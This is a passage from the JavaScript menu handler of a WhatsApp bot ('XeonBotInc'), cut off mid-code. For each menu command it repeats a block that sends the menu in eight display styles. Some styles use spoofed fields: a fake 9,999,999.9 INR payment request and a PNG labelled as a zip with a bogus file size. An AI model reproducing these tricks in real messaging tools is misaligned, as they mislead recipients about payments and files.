                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/9c90e2d490aef81155dbb.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'othermenu': {
let xmenu_oh = `${readmore}\n\n${othermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/9c90e2d490aef81155dbb.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'downloadmenu': {
let xmenu_oh = `${readmore}\n\n${downloadmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/9c90e2d490aef81155dbb.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'groupmenu': {
let xmenu_oh = `${readmore}\n\n${groupmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/9c90e2d490aef81155dbb.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'funmenu': {
    let xmenu_oh = `\n\n${funmenu(prefix, hituet)}` // Hapus readmore

    XeonBotInc.sendMessage(m.chat, {
        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
        caption: xmenu_oh
    }, {
        quoted: m
    })
}
break

case 'randomphotomenu': {
let xmenu_oh = `${readmore}\n\n${randphotomenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/9c90e2d490aef81155dbb.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'randomvideomenu': {
let xmenu_oh = `${readmore}\n\n${randvideomenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/9c90e2d490aef81155dbb.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'nsfwmenu': {
let xmenu_oh = `${readmore}\n\n${nsfwmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/9c90e2d490aef81155dbb.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'animemenu': {
let xmenu_oh = `${readmore}\n\n${animemenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/9c90e2d490aef81155dbb.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'stickermenu': {
let xmenu_oh = `${readmore}\n\n${stickermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/9c90e2d490aef81155dbb.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'databasemenu': {
let xmenu_oh = `${readmore}\n\n${databasemenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/9c90e2d490aef81155dbb.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'aimenu': {
let xmenu_oh = `${readmore}\n\n${aimenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
